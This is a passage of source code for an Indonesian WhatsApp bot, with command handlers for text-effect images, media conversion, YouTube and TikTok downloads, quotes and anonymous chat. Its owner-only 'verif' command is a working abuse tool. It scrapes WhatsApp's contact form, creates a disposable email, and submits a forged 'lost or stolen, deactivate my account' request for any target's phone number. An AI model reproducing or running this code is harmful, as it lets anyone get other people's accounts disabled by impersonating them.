"https://textpro.me/create-blackpink-logo-style-online-1001.html";
if (/sand/.test(command))
link =
"https://textpro.me/write-in-sand-summer-beach-free-online-991.html";
if (/glue/.test(command))
link =
"https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html";
if (/1917/.test(command))
link =
"https://textpro.me/1917-style-text-effect-online-980.html";
if (/leaves/.test(command))
link = "https://textpro.me/natural-leaves-text-effect-931.html";
let anu = await textpro.textpro(link, q);
satria.sendMessage(
m.chat,
{ image: { url: anu }, caption: `done ga bang?` },
{ quoted: m }
);
}
break;
case "glitchtext":
case "writetext":
case "advancedglow":
case "typographytext":
case "pixelglitch":
case "neonglitch":
case "flagtext":
case "flag3dtext":
case "deletingtext":
case "blackpinkstyle":
case "glowingtext":
case "underwatertext":
case "logomaker":
case "cartoonstyle":
case "papercutstyle":
case "watercolortext":
case "effectclouds":
case "blackpinklogo":
case "gradienttext":
case "summerbeach":
case "luxurygold":
case "multicoloredneon":
case "sandsummer":
case "galaxywallpaper":
case "1917style":
case "makingneon":
case "royaltext":
case "freecreate":
case "galaxystyle":
case "lighteffects":
{
const { ephoto } = require("./lib/ephoto");
if (!q) return reply(`Example : ${prefix + command} satria`);
await reply(mess.wait);
let link;
if (/glitchtext/.test(command))
link =
"https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html";
if (/writetext/.test(command))
link =
"https://en.ephoto360.com/write-text-on-wet-glass-online-589.html";
if (/advancedglow/.test(command))
link = "https://en.ephoto360.com/advanced-glow-effects-74.html";
if (/typographytext/.test(command))
link =
"https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html";
if (/pixelglitch/.test(command))
link =
"https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html";
if (/neonglitch/.test(command))
link =
"https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html";
if (/flagtext/.test(command))
link =
"https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html";
if (/flag3dtext/.test(command))
link =
"https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html";
if (/deletingtext/.test(command))
link =
"https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html";
if (/blackpinkstyle/.test(command))
link =
"https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html";
if (/glowingtext/.test(command))
link =
"https://en.ephoto360.com/create-glowing-text-effects-online-706.html";
if (/underwatertext/.test(command))
link =
"https://en.ephoto360.com/3d-underwater-text-effect-online-682.html";
if (/logomaker/.test(command))
link =
"https://en.ephoto360.com/free-bear-logo-maker-online-673.html";
if (/cartoonstyle/.test(command))
link =
"https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html";
if (/papercutstyle/.test(command))
link =
"https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html";
if (/watercolortext/.test(command))
link =
"https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html";
if (/effectclouds/.test(command))
link =
"https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html";
if (/blackpinklogo/.test(command))
link =
"https://en.ephoto360.com/create-blackpink-logo-online-free-607.html";
if (/gradienttext/.test(command))
link =
"https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html";
if (/summerbeach/.test(command))
link =
"https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html";
if (/luxurygold/.test(command))
link =
"https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html";
if (/multicoloredneon/.test(command))
link =
"https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html";
if (/sandsummer/.test(command))
link =
"https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html";
if (/galaxywallpaper/.test(command))
link =
"https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html";
if (/1917style/.test(command))
link = "https://en.ephoto360.com/1917-style-text-effect-523.html";
if (/makingneon/.test(command))
link =
"https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html";
if (/royaltext/.test(command))
link =
"https://en.ephoto360.com/royal-text-effect-online-free-471.html";
if (/freecreate/.test(command))
link =
"https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html";
if (/galaxystyle/.test(command))
link =
"https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html";
if (/lighteffects/.test(command))
link =
"https://en.ephoto360.com/create-light-effects-green-neon-online-429.html";
let haldwhd = await ephoto(link, q);
satria.sendMessage(
m.chat,
{ image: { url: haldwhd }, caption: `done ga bang?` },
{ quoted: m }
);
}
break;
case "shadow":
case "write":
case "romantic":
case "burnpaper":
case "smoke":
case "narutobanner":
case "love":
case "undergrass":
case "doublelove":
case "coffecup":
case "underwaterocean":
case "smokyneon":
case "starstext":
case "rainboweffect":
case "balloontext":
case "metalliceffect":
case "embroiderytext":
case "flamingtext":
case "stonetext":
case "writeart":
case "summertext":
case "wolfmetaltext":
case "nature3dtext":
case "rosestext":
case "naturetypography":
case "quotesunder":
case "shinetext":
{
const photooxy = require("./lib/photooxy");
if (!q) return reply(`Example : ${prefix + command} satria`);
await reply(mess.wait);
let link;
if (/stonetext/.test(command))
link =
"https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html";
if (/writeart/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html";
if (/summertext/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html";
if (/wolfmetaltext/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html";
if (/nature3dtext/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html";
if (/rosestext/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html";
if (/naturetypography/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html";
if (/quotesunder/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html";
if (/shinetext/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html";
if (/shadow/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html";
if (/write/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html";
if (/romantic/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html";
if (/burnpaper/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html";
if (/smoke/.test(command))
link =
"https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html";
if (/narutobanner/.test(command))
link =
"https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html";
if (/love/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html";
if (/undergrass/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html";
if (/doublelove/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/love-text-effect-372.html";
if (/coffecup/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html";
if (/underwaterocean/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html";
if (/smokyneon/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html";
if (/starstext/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html";
if (/rainboweffect/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html";
if (/balloontext/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html";
if (/metalliceffect/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html";
if (/embroiderytext/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html";
if (/flamingtext/.test(command))
link =
"https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html";
let dehe = await photooxy.photoOxy(link, q);
satria.sendMessage(
m.chat,
{ image: { url: dehe }, caption: `done ga bang?` },
{ quoted: m }
);
}
break;
case "toimg":
case "toimage":
{
if (!/webp/.test(mime))
return reply(`Reply stiker dengan caption *${prefix + command}*`);
await reply(mess.loading);
let { webp2mp4File } = require("./lib/uploader");
let media = await satria.downloadAndSaveMediaMessage(qmsg);
let webpToMp4 = await webp2mp4File(media);
await satria.sendFileFromUrl(
m.chat,
webpToMp4.result,
"Convert Webp To Video");
await fs.unlinkSync(media);
}
break;
case "toaudio":
{
if (!/video/.test(mime) && !/audio/.test(mime))
return reply(
`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${
prefix + command
}`
);
await reply(mess.loading);
let media = await satria.downloadMediaMessage(qmsg);
let { toAudio } = require("./lib/converter");
let audio = await toAudio(media, "mp4");
satria.sendMessage(
m.chat,
{ audio: audio, mimetype: "audio/mpeg" },
{ quoted: m }
);
}
break;
case "tomp3":
{
if (!/video/.test(mime) && !/audio/.test(mime))
return reply(
`Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${
prefix + command
}`
);
await reply(mess.loading);
let media = await satria.downloadMediaMessage(qmsg);
let { toAudio } = require("./lib/converter");
let audio = await toAudio(media, "mp4");
satria.sendMessage(
m.chat,
{
document: audio,
mimetype: "audio/mpeg",
fileName: `Convert By SatganzDevs.mp3`,
},
{ quoted: m }
);
}
break;
case "tovn":
{
if (!/video/.test(mime) && !/audio/.test(mime))
return reply(
`Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${
prefix + command
}`
);
await reply(mess.loading);
let media = await satria.downloadMediaMessage(qmsg);
let { toPTT } = require("./lib/converter");
let audio = await toPTT(media, "mp4");
satria.sendMessage(
m.chat,
{
audio: audio,
mimetype: "audio/ogg; codecs=opus",
waveform: new Uint8Array(64),
ptt: true,
},
{ quoted: m }
);
}
break;
case "togif":
{
if (!/webp/.test(mime))
return reply(`Reply stiker dengan caption *${prefix + command}*`);
await reply(mess.loading);
let { webp2mp4File } = require("./lib/uploader");
let media = await satria.downloadAndSaveMediaMessage(qmsg);
let webpToMp4 = await webp2mp4File(media);
await satria.sendMessage(
m.chat,
{
video: {
url: webpToMp4.result,
caption: "Convert Webp To Video",
},
gifPlayback: true,
},
{ quoted: m }
);
await fs.unlinkSync(media);
}
break;
case "quotes":
{
if (!q)
return satria.sendPoll(from, "Select One", [
".quotes senja",
".quotes islami",
".quotes anime",
".quotes bacot",
".quotes dilan",
]);
if (q === "senja") {
let med = await fetchJson(
`https://api.satganzdevs.cloud/api/quotes/senja`
);
reply(med.quote);
}
if (q === "islami") {
let med = await fetchJson(
`https://api.satganzdevs.cloud/api/quotes/islami`
);
reply(med.quote);
}
if (q === "bacot") {
let med = await fetchJson(
`https://api.satganzdevs.cloud/api/quotes/${q}`
);
reply(med.quote);
}
if (q === "dilan") {
let med = await fetchJson(
`https://api.satganzdevs.cloud/api/quotes/${q}`
);
reply(med.quote);
}
if (q === "anime") {
let med = await fetchJson(
`https://api.satganzdevs.cloud/api/quotes/anime`
);
satria.sendMessage(
from,
{ text: `${med.result.quotes}\n - ${med.result.karakter}` },
{ quoted: m }
);
}
}
break;
case "ngegalau":
case "ngesad":
{
let bro = await satria.sendMessage(
from,
{ text: pickRandom(quotes.sad), mentions: [m.sender] },
{ quoted: m }
);
satria.sendMessage(
from,
{
audio: fs.readFileSync(playRandom("./sound")),
mimetype: "audio/mpeg",
ptt: true,
waveform: new Uint8Array(64),
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: ":)",
body: pickRandom(quotes.body),
previewType: "PHOTO",
mediaType: 1,
thumbnail: global.thumb,
sourceUrl: `https://instagram.com/kurniawan_satriaaaa`,
},
},
},
{ quoted: bro }
);
}
break;
case "quotesislami":
{
var ha = await fetchJson(
"https://a.satganzdevs.repl.co/api/randomquote/muslim?apikey=satganzdevs"
);
reply(`*${ha.quote}*`);
}
break;
case "verif":
if (!isCreator) return reply(mess.ownerOnly);
{
if (text) {
let no =
text.replace(/[^0-9]/g, "").replace(/[^0-9]/g, "") +
"@s.whatsapp.net";
let tagsv = no
.replace(/[@s.whatsapnet]/g, "")
.replace(/[@S.WHATSAPNET]/g, "");
var cekon = await satria.onWhatsApp(no);
if (cekon.length == 0)
return reply(
`Peserta tersebut Sudah Tidak Terdaftar Di WhatsApp`
);
if (tagsv == "6281316701742" + "@s.whatsapp.net")
return reply(`Tidak Bisa Verif My Creator!`);
var targetnya = m.sender.split("@")[0];
try {
var axioss = require("axios");
let ntah = await axioss.get(
"https://www.whatsapp.com/contact/noclient/"
);
let email = await axioss.get(
"https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=2022"
);
let cookie = ntah.headers["set-cookie"].join("; ");
const cheerio = require("cheerio");
let $ = cheerio.load(ntah.data);
let $form = $("form");
let url = new URL(
$form.attr("action"),
"https://www.whatsapp.com"
).href;
let form = new URLSearchParams();
form.append("jazoest", $form.find("input[name=jazoest]").val());
form.append("lsd", $form.find("input[name=lsd]").val());
form.append("step", "submit");
form.append("country_selector", "INDONESIA");
form.append("phone_number", `${no}`);
form.append("email", email.data[0]);
form.append("email_confirm", email.data[0]);
form.append("platform", "ANDROID");
form.append(
"your_message",
`Perdido/roubado: desative minha conta`
);
form.append("__user", "0");
form.append("__a", "1");
form.append("__csr", "");
form.append("__req", "8");
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
form.append("dpr", "1");
form.append("__ccg", "UNKNOWN");
form.append("__rev", "1006630858");
form.append("__comment_req", "0");

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie,
},
});
let payload = String(res.data);
if (payload.includes(`"payload":true`)) {
reply(`Succes.. Nomor @${tagsv} Telah Out!`);
} else if (payload.includes(`"payload":false`)) {
reply(`Sedang Limit Tunggu Beberapa Saat.`);
} else reply(util.format(res.data));
} catch (err) {
reply(`${err}`);
}
} else reply("Masukkan Nomor Target!");
}
break;
case "couple":
{
await reply(mess.loading);
let anu = await fetchJson(
"https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json"
);
let random = anu[Math.floor(Math.random() * anu.length)];
satria.sendMessage(
m.chat,
{ image: { url: random.male }, caption: `Couple Male` },
{ quoted: m }
);
satria.sendMessage(
m.chat,
{ image: { url: random.female }, caption: `Couple Female` },
{ quoted: m }
);
}
break;
case "ytsearch":
case "yts":
{
if (!text)
return reply(`Example : ${prefix + command} story wa anime`);
let yts = require("yt-search");
let search = await yts(text);
let teks = "YouTube Search\n\n Result From " + text + "\n\n";
let no = 1;
for (let i of search.all) {
teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${
i.videoId
}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${
i.timestamp
}\n⭔ Upload At : ${i.ago}\n⭔ Author : ${i.author.name}\n⭔ Url : ${
i.url
}\n\n─────────────────\n\n`;
}
satria.sendMessage(
m.chat,
{ image: { url: search.all[0].thumbnail }, caption: teks },
{ quoted: m }
);
}
break;
case "play":
{
if (!text)
return reply(`Example : ${prefix + command} story wa anime`);
let yts = require("yt-search");
let search = await yts(text);
let anu = search.videos[0];
console.log(anu);
try {
var thumbnya = `https://i.ytimg.com/vi/${anu.url}/hqdefault.jpg`;
} catch (err) {
var thumbnya = `https://i.ytimg.com/vi/${anu.url}/default.jpg`;
}
try {
let bro = await ytdl.getInfo(anu.url);
console.log(bro);
let mp3File = getRandom(".mp3");
ytdl(anu.url, {
filter: "audioonly",
})
.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {
await satria.sendMessage(
m.chat,
{
audio: fs.readFileSync(mp3File),
mimetype: "audio/mpeg",
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: anu.title,
body: anu.description,
previewType: "PHOTO",
mediaType: 1,
renderLargerThumbnail: true,
thumbnailUrl: anu.thumbnail,
sourceUrl: anu.url,
},
},
},
{ quoted: m }
);
fs.unlinkSync(mp3File);
});
} catch (err) {
console.log(err);
}
}
break;
case "ytmp3":
{
if (!text)
return reply(
`Example : ${
prefix + command
} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
);
try {
var thumbnya = `https://i.ytimg.com/vi/${q}/hqdefault.jpg`;
} catch (err) {
var thumbnya = `https://i.ytimg.com/vi/${q}/default.jpg`;
}
try {
let bro = await ytdl.getInfo(q);
let mp3File = getRandom(".mp3");
ytdl(q, {
filter: "audioonly",
})
.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {
await satria.sendMessage(
m.chat,
{
audio: fs.readFileSync(mp3File),
mimetype: "audio/mpeg",
second: 86400,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: bro.title,
body: bro.description,
previewType: "VIDEO",
mediaType: 1,
renderLargerThumbnail: true,
thumbnailUrl: thumbnya,
sourceUrl: q,
},
},
},
{ quoted: m }
);
fs.unlinkSync(mp3File);
});
} catch (err) {
reply(err.toString());
}
}
break;
case "ytmp4":
{
if (!text)
return reply(
`Example : ${
prefix + command
} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
);
try {
let inf = await ytdl.getVideoID(q)
let res = await ytdl.getInfo(inf)
console.log(res)
let mp4File = getRandom(".mp4");
ytdl(q, {
filter: "videoonly",
})
.pipe(fs.createWriteStream(mp4File))
.on("finish", async () => {
await satria.sendMessage(
m.chat,
{
video: fs.readFileSync(mp4File),
caption: `*TITLE*: ${inf.title}\n*DESCRIPTION*: ${inf.description}`,
mimetype: "video/mp4",
},
{ quoted: m }
);
fs.unlinkSync(mp4File);
});
} catch (err) {
reply(err.toString());
}
}
break;
case "tiktok":
{
if (!q) return reply('mana linknya?')
const { ttdl } = require("btch-downloader");
try {
await ttdl(q).then(async (res) => {
await satria.sendMessage(
m.chat,
{
video: await getBuffer(res.video),
caption: ``,
},
{ quoted: m }
);
});
await react(pickRandom(["👌", "✅", "✔️"]));
} catch (error) {
const tik = require("tiktod");
tik.download(q).then((json) => {
for (let i of json.result.media) {
satria.sendFileFromUrl(m.chat, i, "done", m);
}
});
await react(pickRandom(["👌", "✅", "✔️"]));
}
}
break;
case "tiktokmp3":
{
if (!m.isGroup && !isCreator) return onlyPrem()
try {
const tik = require("tiktod");
tik.download(text).then((json) => {
console.log(json);
satria.sendMessage(
m.chat,
{
audio: { url: json.result.music.url },
mimetype: "audio/mpeg",
},
{ quoted: fkontak }
);
});
} catch (error) {
console.log(error);
reply("error");
}
}
break;
case "scdl":
{
if (!m.isGroup && !isCreator) return onlyPrem()
await react("👌");
soundcloud(q).then((r) => {
satria.sendMessage(
from,
{
audio: { url: r.link },
mimetype: "audio/mpeg",
ptt: false,
// wavefrom: new Uint8Array(64),
},
{ quoted: m }
);
});
}
break;
case "sticker":
case "stiker":
case "s":
{
if (/image/.test(mime)) {
let media = await satria.downloadMediaMessage(qmsg);
const sticker = new Sticker(media, {
pack: `\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`,
author: "@SatganzDevs",
type: StickerTypes.FULL,
categories: ["🤩", "🎉"],
id: "12345",
quality: 50,
background: "#000000",
});
const buffer = await sticker.toBuffer();
let memek = await sticker.toFile("sticker.webp");
satria.sendMessage(
m.chat,
{ sticker: fs.readFileSync(memek) },
{ quoted: m }
);
await fs.unlinkSync(memek);
} else if (/video/.test(mime)) {
let media = await satria.downloadMediaMessage(qmsg);
let encmedia = await satria.sendVideoAsSticker(m.chat, media, m, {
packname: `\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`,
author: "@kurniawan_satriaaaa",
});
await fs.unlinkSync(encmedia);
} else {
reply(
`Kirim/reply gambar/video/gif dengan caption ${
prefix + command
}\nDurasi Video/Gif 1-9 Detik`
);
}
}
break;
case "setppbot":
{
if (!isCreator) return reply(mess.ownerOnly);
let medis = await satria.downloadAndSaveMediaMessage(qmsg, "ppg");
var { img } = await generateProfilePicture(medis);
await satria.query({
tag: "iq",
attrs: {
to: botNumber,
type: "set",
xmlns: "w:profile:picture",
},
content: [
{
tag: "picture",
attrs: { type: "image" },
content: img,
},
],
});
fs.unlinkSync(medis);
reply("sucess change profile picture");
}
break;
case "akira":
case "akiyama":
case "anna":
case "asuna":
case "ayuzawa":
case "boruto":
case "chitanda":
case "chitoge":
case "deidara":
case "doraemon":
case "elaina":
case "emilia":
case "asuna":
case "erza":
case "gremory":
case "hestia":
case "hinata":
case "inori":
case "isuzu":
case "itachi":
case "itori":
case "kaga":
case "kagura":
case "kakasih":
case "kaori":
case "kosaki":
case "kotori":
case "kuriyama":
case "kuroha":
case "kurumi":
case "loli":
case "madara":
case "mikasa":
case "miku":
case "minato":
case "naruto":
case "natsukawa":
case "neko2":
case "nekohime":
case "nezuko":
case "nishimiya":
case "onepiece":
case "pokemon":
case "rem":
case "rize":
case "sagiri":
case "sakura":
case "sasuke":
case "shina":
case "shinka":
case "shizuka":
case "shota":
case "tomori":
case "toukachan":
case "tsunade":
case "yatogami":
case "yuki":
{
let res = await fetchJson(
`https://raw.githubusercontent.com/KazukoGans/database/main/anime/${command}.json`
);
let cita = res[Math.floor(Math.random() * res.length)];
await satria.sendMessage(
from,
{ image: { url: cita }, caption: "nih" },
{ quoted: fkontak }
);
}
break;
case "lyrics":
case "lirik":
{
if (!q) return reply("please input the query!");
let res = await fetchJson(
`https://api.satganzdevs.cloud/api/lirik?query=${q}`
);
satria.sendMessage(
from,
{ image: { url: res.result.thumb }, caption: res.result.lirik },
{ quoted: m }
);
}
break;
case "toqr":
{
const buffer = await QRCode.toBuffer(q, { scale: 8 });
satria
.sendMessage(
from,
{
image: buffer,
caption: "nih",
mimetype: "image/png",
},
{ quoted: m }
)
}
break;
case "darkjokes":
{
satria.sendMessage(
from,
{
image: {
url: "https://api.satganzdevs.cloud/api/random/darkjokes",
},
},
{ quoted: m }
);
}
break;
case "waifu":
{
satria.sendMessage(
from,
{
image: {
url: "https://api.satganzdevs.cloud/api/random/waifu",
},
},
{ quoted: m }
);
}
break;
case "paimon":
{
satria.sendImageAsSticker(
from,
"https://api.satganzdevs.cloud/api/stiker/paimon"
);
}
break;
case "wallpaperanime":
{
satria.sendImage(
from,
"https://api.satganzdevs.cloud/api/animewallpaper",
"Powered By SatganzDevs",
m
);
}
break;
case "taugasih":
{
let result = await fetchJson(
"https://api.satganzdevs.cloud/api/taugasih"
);
satria.sendMessage(
from,
{
image: {
url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcREz47eH1d0wwKCwp2YgD6qKUmaQpHMvNe7Rw&usqp=CAU",
},
caption: result.fakta,
},
{ quoted: m }
);
}
break;
case "pinterest":{
if (!q) return reply('masukan query pencarian, contoh .pinterest freyajkt48')
await pinterest(q).then((res) => {
for (let i of res) {
satria.sendMessage(m.chat, {image: {url: i}})
}
})
}
break;
    case "menfes":
    case "menfess":
      {
        if (m.isGroup)
          return reply("Fitur ini tidak dapat digunakan di grup.");
        if (!text) return reply(`Contoh: ${prefix + command} 6282xxxxx`);
        this.menfess = this.menfess ? this.menfess : {};
        let targetNumber = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        let targetTags = targetNumber
          .replace(/[@s.whatsapnet]/g, "")
          .replace(/[@S.WHATSAPNET]/g, "");
        var checkTarget = await satria.onWhatsApp(targetNumber);
        if (targetNumber == m.sender)
          return reply("Tidak bisa mengirim pesan ke nomor sendiri!");
        if (checkTarget.length == 0)
          return reply(
            `Nomor tersebut tidak terdaftar di WhatsApp.\n\nMasukkan nomor yang valid dan terdaftar di WhatsApp.`
          );
        let id = +new Date();
        this.menfess[id] = {
          id,
          a: m.sender,
          b: targetNumber,
          state: "WAITING",
          check: function (who = "") {
            return [this.a, this.b].includes(who);
          },
          other: function (who = "") {
            return who === this.a ? this.b : who === this.b ? this.a : "";
          },
        };
        let senderName = await satria.getName(m.sender);
        let targetName = await satria.getName(targetNumber);
        let pjText = `Halo ${targetName}\nSeseorang ingin mengirimkan pesan anonim denganmu. Balas *Y* untuk menerima dan *N* untuk menolak.`;
        let akhji = `Menunggu penerima untuk mengkonfirmasi...`;
        reply(akhji);
        satria.sendText(targetNumber, pjText, m);
      }
      break;

    case "delmenfess":
    case "dm":
    case "hapusmenfess":
      {
        if (m.isGroup)
          return reply("Fitur ini tidak dapat digunakan untuk grup!");
        this.menfess = this.menfess ? this.menfess : {};
        let room = Object.values(this.menfess).find((room) =>
          room.check(m.sender)
        );
        if (!room) {
          await reply(
            `\`\`\`Kamu Sedang Tidak Berada Di Sesi Menfess, Ketik .menfess untuk memulai\`\`\``
          );
          throw false;
        }
        if (room) {
          reply(`\`\`\`Kamu Telah Meninggalkan Sesi Menfess\`\`\``);
          let other = room.other(m.sender);
          if (other)
            await satria.sendText(
              other,
              `\`\`\`Partner Telah Meninggalkan Sesi Menfess\`\`\``,
              m
            );
          delete this.menfess[room.id];
        }
      }
      break;
    case "anonymous":
      {
        if (m.isGroup)
          return m.reply("Fitur Tidak Dapat Digunakan Untuk Group!");
        m.reply(
          `\`\`\`Hi ${await satria.getName(
            m.sender
          )} Welcome To Anonymous Chat\n\nKetik ${prefix}start Untuk Mencari Partner\`\`\``
        );
      }
      break;
    case "keluar":
    case "leave": {
      if (m.isGroup)
        return m.reply("Fitur Tidak Dapat Digunakan Untuk Group!");
      let room = Object.values(db.data.anonymous).find((room) =>
        room.check(m.sender)
      );
      if (!room) {
        m.reply(
          `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Ketik ${prefix}start Untuk Mencari Partner \`\`\``
        );
        throw false;
      }
      m.reply("Ok");
      let other = room.other(m.sender);
      if (other)
        await satria.sendText(
          other,
          `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``,
          m
        );
      delete db.data.anonymous[room.id];
      if (command === "leave") break;
    }
    case "mulai":
    case "start": {
      if (m.isGroup)
        return m.reply("Fitur Tidak Dapat Digunakan Untuk Group!");
      if (
        Object.values(db.data.anonymous).find((room) => room.check(m.sender))
      ) {
        m.reply(
          `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, ketik ${prefix}keluar Untuk Menghentikan Sesi Anonymous Anda\`\`\``
        );
        throw false;
      }
      let room = Object.values(db.data.anonymous).find(
        (room) => room.state === "WAITING" && !room.check(m.sender)
      );
      if (room) {
        satria.sendText(
          room.a,
          `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\nKetik ${prefix}start untuk next\nKetik ${prefix}keluar untuk keluar dari sesi anonymous.\`\`\``,
          m
        );
        room.b = m.sender;
        room.state = "CHATTING";
        await satria.sendText(
          room.b,
          `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\nKetik ${prefix}start untuk next\nKetik ${prefix}keluar untuk keluar dari sesi anonymous.\`\`\``,
          m
        );
      } else {
        let id = +new Date();
        db.data.anonymous[id] = {
          id,
          a: m.sender,
          b: "",
          state: "WAITING",
          check: function (who = "") {
            return [this.a, this.b].includes(who);
          },
          other: function (who = "") {
            return who === this.a ? this.b : who === this.b ? this.a : "";
          },
        };
        m.reply(`\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``);
      }
      break;
    }
    case "next":
    case "lanjut": {
      if (m.isGroup)
        return m.reply("Fitur Tidak Dapat Digunakan Untuk Group!");
      let romeo = Object.values(db.data.anonymous).find((room) =>
        room.check(m.sender)
      );
      if (!romeo) {
        m.reply(
          `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, ketik ${prefix}start Untuk Mencari Partner\`\`\``
        );
        throw false;
      }
      let other = romeo.other(m.sender);
      if (other)
        await satria.sendText(
          other,
          `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``,
          m
        );
      delete db.data.anonymous[romeo.id];
      let room = Object.values(db.data.anonymous).find(
        (room) => room.state === "WAITING" && !room.check(m.sender)
      );
      if (room) {
        await satria.sendText(
          room.a,
          `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\nKetik ${prefix}start untuk next\nKetik ${prefix}keluar untuk keluar dari sesi anonymous.\`\`\``,
          m
        );
        room.b = m.sender;
        room.state = "CHATTING";
        await satria.sendText(
          room.b,
          `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\nKetik ${prefix}start untuk next\nKetik ${prefix}keluar untuk keluar dari sesi anonymous.\`\`\``,
          m
        );
      } else {
        let id = +new Date();
        db.data.anonymous[id] = {
          id,
          a: m.sender,
          b: "",
          state: "WAITING",
          check: function (who = "") {
            return [this.a, this.b].includes(who);
          },
          other: function (who = "") {
            return who === this.a ? this.b : who === this.b ? this.a : "";
          },
        };
        m.reply(`\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``);
      }
      break;
    }
    case "ping":
    case "botstatus":
    case "statusbot":
      {
        const used = process.memoryUsage();
        const cpus = os.cpus().map((cpu) => {
          cpu.total = Object.keys(cpu.times).reduce(
            (last, type) => last + cpu.times[type],
            0
          );
          return cpu;
        });
        const cpu = cpus.reduce(
          (last, cpu, _, { length }) => {
            last.total += cpu.total;
            last.speed += cpu.speed / length;
            last.times.user += cpu.times.user;
            last.times.nice += cpu.times.nice;
            last.times.sys += cpu.times.sys;
            last.times.idle += cpu.times.idle;
            last.times.irq += cpu.times.irq;
            return last;
          },
          {
            speed: 0,
            total: 0,
            times: {
              user: 0,
              nice: 0,
              sys: 0,
              idle: 0,
              irq: 0,
            },
          }
        );
        let timestamp = speed();
